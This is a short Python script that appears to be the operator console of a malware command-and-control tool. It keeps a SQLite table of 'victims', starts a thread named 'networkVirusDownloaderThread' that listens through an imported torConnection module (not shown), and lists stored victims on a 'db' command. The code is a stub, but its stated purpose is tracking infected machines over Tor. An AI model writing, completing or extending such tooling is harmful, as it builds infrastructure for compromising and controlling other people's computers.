import sqlite3, torConnection, threading

dbConnection = sqlite3.connect("victims.db")
dbCursor = dbConnection.cursor()

networkVirusDownloaderThread = threading.Thread(target= torConnection.hearingLoop).start()

dbCursor.execute("INSERT INTO victims VALUES ('test', 'test','test')")

#replace this anyways with a UI
while True:
    cmd = input(">")
    if cmd == "db":
        dbCursor.execute("SELECT * FROM victims")
        # fetch all the matching rows 
        result = dbCursor.fetchall()
        # loop through the rows
        for row in result:
            print(row)
            print("\n")

    




